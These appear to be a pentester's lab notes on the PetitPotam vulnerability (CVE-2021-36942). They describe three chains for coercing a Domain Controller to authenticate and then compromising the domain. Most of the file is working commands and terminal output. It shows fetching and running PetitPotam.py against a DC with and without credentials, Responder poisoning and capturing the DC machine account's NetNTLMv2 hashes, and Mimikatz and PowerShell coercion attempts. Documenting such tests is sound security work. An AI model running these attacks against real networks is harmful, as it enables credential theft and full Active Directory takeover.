===================================================================================================================
PetitPotam  exploit tests (CVE-2021-36942)
===================================================================================================================

By exploiting the PetitPotam vulnerability on an affected Windows machine (ideally a Domain Controller) we can coerce it do a callback (NTLM authentication) to any server we want. 
This allow multiple attacks that could lead to full Domain compromise such as the following examples:

> [ATTACK 1] We force an affected Domain Controller to connect (CIFS/SMB) to our attacker machine running 'Responder'.
  Using Responder we can capture the NetNTLMv2 hash or NetNTLMv1 hash (i.e. if there is no hardening of the 'Lan Manager authentication level' settings, we can downgarde 
  authentication to NetNTLMv1 Challenge/Response authentication which uses the outdated encryption method DES to protect the NT/LM Hashes).
  Then we can use Hashcat or John (JTR) to try crack the NetNTLM hash and obtain the password of the Domain Controller's computer account and finally do a DCsync attack.
             
> [ATTACK 2] We force an affected Domain Controller to connect (CIFS/SMB) to a Windows domain server with Kerberos unconstrained delegation enabled on it (that we have previoulsy 'hacked')
   Any user/computer account authentication (e.g. CIFS) to a Windows domain server with Kerberos unconstrained delegation enabled on it, will cache that user/computer's Kerberos
   TGT in memory, which can be dumped and reused (for example using the tool Mimikatz) by an adversary who has compromised this Windows server to do a DCsync attack.

> [ATTACK 3 ] We force an affected Domain Controller to connect (CIFS/SMB) to our attacker machine running 'ntlmrelayx' to relay the Domain Controller’s NTLM Credentials 
  to Active Directory Certificate Services (AD CS) Web Enrollment pages. This can be used to enroll a DC certificate. This certificate can then be used to request a TGT 
  (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.

Note: According to the noets on 'PayloadsAllTheThings', this attack is not patched for authenticated users so if the attack does not work as an unauthenticated attacker
      then it worth it to test it with a standard domain user account.

Useful URLs
------------
> https://github.com/topotam/PetitPotam
> https://github.com/ly4k/PetitPotam
> https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-Petitpotam.ps1
> https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/


============================================================================================================================================
PoC/Test - Attack 1 - DC computer account's NetNTLM hash capture - Test with PetitPotam.py (from Topotam) and Responder running on a Kali 
============================================================================================================================================

jeff@kali:~/Documents/Tools$ wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
--2022-01-02 16:53:40--  https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16368 (16K) [text/plain]
Saving to: ‘PetitPotam.py’

PetitPotam.py                              100%[========================================================================================>]  15.98K  --.-KB/s    in 0.002s

2022-01-02 16:53:41 (10.4 MB/s) - ‘PetitPotam.py’ saved [16368/16368]

jeff@kali:~/Documents/Tools$ chmod +x PetitPotam.py

Test as an unauthenticated attacker
-----------------------------------
jeff@kali:~/Documents/Tools$ python3 ./PetitPotam.py 192.168.1.12 192.168.1.50
              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

[-] Connecting to ncacn_np:192.168.1.50[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

Test with satnadrad user creds
------------------------------
jeff@kali:~/Documents/Tools$ python3 ./PetitPotam.py -u jules_clay -p Welcome1 -d security-lab 192.168.1.12 192.168.1.50
              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

[-] Connecting to ncacn_np:192.168.1.50[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!


=> The exploit worked with and without creds see below the results with 'Responder'
-----------------------------------------------------------------------------------

jeff@kali:~$ sudo responder -I eth0 -wrf --lm -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.12]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-C9TAY5HIU88]
    Responder Domain Name      [8PMK.LOCAL]
    Responder DCE-RPC Port     [45259]

[+] Listening for events...

<SNIP>
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name proxysrv
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[PROXY] Received connection from 192.168.1.50
[SMB] NTLMv2 Client   : 192.168.1.50
[SMB] NTLMv2 Username : SECURITY-LAB\TEMP-DC$
[SMB] NTLMv2 Hash     : TEMP-DC$::SECURITY-LAB:1e3da12d27f6040e:4AEFF12100BE6A8CE11191CF5944A2F2:0101000000000000DEAC46EB5EFCD701E5A9CECF91F31F0000000000020000000000000000000000
<SNIP>
[SMB] NTLMv2 Client   : 192.168.1.50
[SMB] NTLMv2 Username : SECURITY-LAB\TEMP-DC$
[SMB] NTLMv2 Hash     : TEMP-DC$::SECURITY-LAB:6ceec1890523aa35:16A49150DF86CB054B91274441DC8498:0101000000000000DDFDD6B25FFCD701A3A95C220167006000000000020000000000000000000000
<SNIP>


Note: 
=====
On my pentest lab, the Lan Manager authentication level is set to send NTLMv2 responses only. That is the reason why the authentication downgrade attack to NetNTLMv1 did not worked
and we get the NetNTLMv2 hash of the DC's computer account password.

Other tests
============

Test with Invoke-Petitpotam.ps1 => KO on my pentest lab
--------------------------------------------------------
PS C:\Users\Administrator\Documents\Tools-AD> Import-Module .\Invoke-Petitpotam.ps1
PS C:\Users\Administrator\Documents\Tools-AD> Invoke-PetitPotam /server:192.168.1.50 /connect:192.168.1.12 /authuser:security-lab\Jules_clay /authpassword:Welcome1
Hostname: PO718687.lab.intraxa / S-1-5-21-936125016-2310263949-2175806047

  Misc-Katz Start - type misc:: for module options/
[auth ] Explicit authentication
[auth ] Username: /authuser:security-lab\Jules_clay
[auth ] Password: /authpassword:Welcome1
[ rpc ] Endpoint: \pipe\lsarpc
[trans] Disconnect eventual IPC: OK
[trans] Connect to IPC: ERROR kcpdclqlmisc_efs ; WNetAddConnection2:53


Test with Mimikatz => KO on my pentest lab
-------------------------------------------
PS C:\Users\Administrator.PO718687\Documents\Tools-AD\mimikatz_trunk_last\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
mimikatz # misc::efs /server:192.168.1.50 /connect:192.168.1.12
[auth ] Default (current)
[ rpc ] Endpoint: \pipe\lsarpc
[trans] Disconnect eventual IPC: OK
[trans] Connect to IPC: ERROR kuhl_m_misc_efs ; WNetAddConnection2:1326

